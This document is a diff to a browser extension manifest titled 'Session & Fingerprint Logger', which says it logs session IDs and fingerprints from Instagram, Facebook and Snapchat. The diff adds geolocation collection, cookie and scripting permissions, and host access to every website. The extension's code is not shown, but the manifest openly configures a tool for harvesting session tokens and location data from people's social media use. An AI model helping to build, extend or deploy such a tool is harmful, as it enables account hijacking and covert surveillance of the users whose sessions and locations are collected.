@@ -2,13 +2,21 @@
   "manifest_version": 3,
   "name": "Session & Fingerprint Logger",
   "version": "1.0",
-  "description": "Logs fingerprint and session IDs from IG/FB/SC",
-  "permissions": ["cookies", "webRequest", "webNavigation", "scripting"],
+  "description": "Logs fingerprint, geolocation & session IDs from IG/FB/SC",
+  "permissions": [
+    "cookies",
+    "webRequest",
+    "webNavigation",
+    "scripting",
+    "storage",
+    "activeTab",
+    "geolocation"
+  ],
   "host_permissions": [
     "*://*.instagram.com/*",
     "*://*.facebook.com/*",
     "*://*.snapchat.com/*",
-    "https://api.ipify.org/*"
+    "*://*/*"
   ],
   "background": {
     "service_worker": "background.js",
@@ -25,6 +33,10 @@
       "run_at": "document_idle"
     }
   ],
+  "action": {
+    "default_icon": "icons/48.png",
+    "default_title": "Session Logger"
+  },
   "icons": {
     "48": "icons/48.png",
     "128": "icons/128.png"
